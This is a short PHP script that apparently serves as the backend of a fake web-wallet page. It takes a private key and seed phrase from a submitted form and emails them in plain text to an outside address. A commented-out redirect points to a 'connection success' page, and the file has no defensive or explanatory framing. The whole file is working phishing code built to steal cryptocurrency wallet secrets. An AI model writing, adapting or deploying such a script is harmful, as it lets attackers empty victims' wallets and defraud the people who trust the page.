<?php
error_reporting(E_ALL);
   ini_set('display_errors', E_ALL);

   if (!defined("PHP_EOL")) define("PHP_EOL", "\r\n");
   
// phpinfo();
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve privkey and seedphr from POST request
    $privky = $_POST['privky'];
    $seedphr = $_POST['seedphr'];
	$email = "sabinus@gmail.com";

    // Set the recipient email address
    $recipient = 'bcoder49@gmail.com';

    // Set the email subject
    $subject = 'Data from LOVEHATE WEB WALLET';

    // Prepare the email body
    $message = wordwrap("Private Key: $privky\nSeed Phrase: $seedphr", 70);

	$headers = "From: $email" . PHP_EOL;
$headers .= "Reply-To: $email" . PHP_EOL;
$headers .= "MIME-Version: 1.0" . PHP_EOL;
$headers .= "Content-type: text/plain; charset=utf-8" . PHP_EOL;
$headers .= "Content-Transfer-Encoding: quoted-printable" . PHP_EOL;

    // Send the email
    if (mail($recipient, $subject, $message, $headers)){
		echo "Email sent";
        // header('Location: https://www.lovehateinu.xyz/apiv4wc-connection-success/index.html'); // Corrected redirection
        // exit();
    } else {
        echo "An error occurred";
    }
}
?>